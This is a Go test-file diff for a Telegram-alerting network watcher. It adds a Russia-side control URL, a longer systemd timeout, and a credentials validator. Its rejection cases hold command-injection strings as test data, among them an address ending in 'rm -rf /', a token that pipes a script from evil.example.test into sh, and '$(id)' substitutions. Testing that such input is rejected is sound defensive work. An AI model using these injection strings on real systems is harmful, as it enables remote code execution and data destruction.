@@ -10,7 +10,8 @@ import (
 
 func hubWatchParams() HubWatchParams {
 	return HubWatchParams{HubAddr: "203.0.113.1", SiteHost: "site.example.test",
-		ControlURL: "https://control.example.test/generate_204", ExitName: "выход 3", StaggerSec: 15}
+		ControlURL: "https://control.example.test/generate_204", ControlRUURL: "https://control-ru.example.test/",
+		ExitName: "выход 3", StaggerSec: 15}
 }
 
 // Review Focus 5: the watcher lies when the exit itself is sick. Before any message it checks
@@ -56,7 +57,7 @@ func TestHubWatchScriptNoSecrets(t *testing.T) {
 	if !strings.Contains(timer, "OnCalendar=minutely") || !strings.Contains(timer, "WantedBy=timers.target") {
 		t.Errorf("timer: %q", timer)
 	}
-	if !strings.Contains(service, "Type=oneshot") || !strings.Contains(service, "ExecStart="+HubWatchScriptPath) || !strings.Contains(service, "TimeoutStartSec=90") {
+	if !strings.Contains(service, "Type=oneshot") || !strings.Contains(service, "ExecStart="+HubWatchScriptPath) || !strings.Contains(service, "TimeoutStartSec=180") {
 		t.Errorf("service: %q", service)
 	}
 	for _, unit := range []string{service, timer} {
@@ -68,11 +69,13 @@ func TestHubWatchScriptNoSecrets(t *testing.T) {
 
 func TestHubWatchScriptValidates(t *testing.T) {
 	for name, p := range map[string]HubWatchParams{
-		"a quote in the name":  {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ExitName: "вы'ход"},
-		"not an address":       {HubAddr: "203.0.113.1; rm -rf /", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ExitName: "выход 3"},
-		"a host with a path":   {HubAddr: "203.0.113.1", SiteHost: "site.example.test/x", ControlURL: "https://c.example.test/", ExitName: "выход 3"},
-		"control without TLS":  {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "http://c.example.test/", ExitName: "выход 3"},
-		"control with a quote": {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/'x", ExitName: "выход 3"},
+		"a quote in the name":     {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ControlRUURL: "https://r.example.test/", ExitName: "вы'ход"},
+		"not an address":          {HubAddr: "203.0.113.1; rm -rf /", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ControlRUURL: "https://r.example.test/", ExitName: "выход 3"},
+		"a host with a path":      {HubAddr: "203.0.113.1", SiteHost: "site.example.test/x", ControlURL: "https://c.example.test/", ControlRUURL: "https://r.example.test/", ExitName: "выход 3"},
+		"control without TLS":     {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "http://c.example.test/", ControlRUURL: "https://r.example.test/", ExitName: "выход 3"},
+		"control with a quote":    {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/'x", ControlRUURL: "https://r.example.test/", ExitName: "выход 3"},
+		"no control in RU":        {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ExitName: "выход 3"},
+		"RU control with a quote": {HubAddr: "203.0.113.1", SiteHost: "site.example.test", ControlURL: "https://c.example.test/", ControlRUURL: "https://r.example.test/'x", ExitName: "выход 3"},
 	} {
 		if err := p.Validate(); err == nil {
 			t.Errorf("%s: accepted", name)
@@ -97,6 +100,12 @@ func hubWatchRun(t *testing.T, dir string, hub, control bool) {
 // hubWatchRunPinned tells the Hub's answer on the pinned address apart from its answer by name.
 func hubWatchRunPinned(t *testing.T, dir string, pinned, byName, control bool) {
 	t.Helper()
+	hubWatchRunFull(t, dir, pinned, byName, control, true)
+}
+
+// hubWatchRunFull also says whether the exit can reach the control address in RU.
+func hubWatchRunFull(t *testing.T, dir string, pinned, byName, control, controlRU bool) {
+	t.Helper()
 	p := hubWatchParams()
 	p.StatePath, p.EnvPath = filepath.ToSlash(filepath.Join(dir, "state")), filepath.ToSlash(filepath.Join(dir, "env"))
 	sent := filepath.ToSlash(filepath.Join(dir, "sent"))
@@ -113,6 +122,7 @@ func hubWatchRunPinned(t *testing.T, dir string, pinned, byName, control bool) {
     *api.telegram.org*) printf '%s\n' "$text" >> '` + sent + `'; return 0 ;;
     *--resolve*"/api/v1/health"*) return ` + flag(pinned) + ` ;;
     *"/api/v1/health"*) return ` + flag(byName) + ` ;;
+    *control-ru.example.test*) return ` + flag(controlRU) + ` ;;
     *control.example.test*) return ` + flag(control) + ` ;;
   esac
   echo "UNEXPECTED curl $*" >&2; return 99
@@ -198,6 +208,15 @@ func TestHubWatchScriptBehaviour(t *testing.T) {
 			t.Fatalf("the control is back: sent %v, want one message", sent)
 		}
 	})
+	t.Run("the exit lost its way to RU while the world answers: silence", func(t *testing.T) {
+		dir := hubWatchDir(t)
+		for i := 0; i < 5; i++ {
+			hubWatchRunFull(t, dir, false, false, true, false)
+		}
+		if sent := hubWatchSent(t, dir); len(sent) != 0 {
+			t.Fatalf("sent %v although the exit itself cannot reach RU", sent)
+		}
+	})
 	t.Run("after the alert, two good runs: «снова доступен» once", func(t *testing.T) {
 		dir := hubWatchDir(t)
 		for i := 0; i < 3; i++ {
@@ -237,4 +256,39 @@ func TestHubWatchScriptBehaviour(t *testing.T) {
 			t.Fatalf("fail, fail, ok, fail: sent %v, want nothing (not three in a row)", sent)
 		}
 	})
+}
+
+// Review finding: the env file is sourced by root on the exit — a token or a chat id that is
+// not exactly a token or a chat id must never reach it.
+func TestHubWatchCredsValidate(t *testing.T) {
+	if err := ValidateHubWatchCreds("123456:AAfake_token-value", "-1001234567890"); err != nil {
+		t.Errorf("good credentials: %v", err)
+	}
+	if err := ValidateHubWatchCreds("123456:AAfake_token-value", "@alerts_channel"); err != nil {
+		t.Errorf("a channel name as the chat: %v", err)
+	}
+	for _, token := range []string{"", "abc", "x'; curl evil.example.test|sh; '", "123456:AA fake", "123456:AA'fake", "123456:AA$(id)", "123456:AA\nX=1"} {
+		if err := ValidateHubWatchCreds(token, "-1001234567890"); err == nil {
+			t.Errorf("token %q accepted", token)
+		}
+	}
+	for _, chat := range []string{"", "abc", "-100'; id; '", "-100 1", "@a", "$(id)"} {
+		if err := ValidateHubWatchCreds("123456:AAfake_token-value", chat); err == nil {
+			t.Errorf("chat %q accepted", chat)
+		}
+	}
+}
+
+// Review finding: the worst run — two looks at the Hub, both controls, the pause, the look
+// again, the message — must fit into the unit's timeout, or systemd kills the watcher before it
+// notes that it has spoken (and it speaks again every minute).
+func TestHubWatchFitsItsTimeout(t *testing.T) {
+	service, _ := HubWatchUnits()
+	if !strings.Contains(service, "TimeoutStartSec=180") {
+		t.Fatalf("service: %q, want TimeoutStartSec=180", service)
+	}
+	const hubLook, control, send, maxStagger = 20, 10, 15, 45
+	if worst := hubLook + 2*control + maxStagger + hubLook + send; worst >= 180 {
+		t.Fatalf("the worst run takes %d s, the unit allows 180", worst)
+	}
 }
